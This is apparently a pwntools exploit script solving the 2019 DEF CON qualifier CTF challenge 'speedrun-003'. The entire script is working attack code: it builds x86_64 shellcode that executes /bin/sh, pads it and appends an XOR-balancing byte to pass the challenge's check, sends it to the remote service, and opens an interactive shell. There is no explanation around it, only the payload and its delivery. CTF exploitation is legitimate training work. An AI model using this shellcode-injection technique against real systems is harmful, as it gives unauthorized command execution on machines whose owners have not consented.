#!/usr/bin/env python
from pwn import *

if len(sys.argv) == 1:
    s = process('./speedrun-003')
else:
    s = remote('speedrun-003.quals2019.oooverflow.io', 31337)

def xor(a):
    return chr(reduce(lambda x, y: x ^ y, map(ord, a), 0))

shellcode = asm('''
    xor rsi, rsi
    push rsi
    mov rax, 0x68732f2f6e69622f
    push rax
    mov rdi, rsp
    xor rax, rax
    xor rdx, rdx
    mov al, SYS_execve
    syscall
''', arch='x86_64').ljust(29, 'A')
shellcode += xor(shellcode)
s.send(shellcode)
s.interactive()
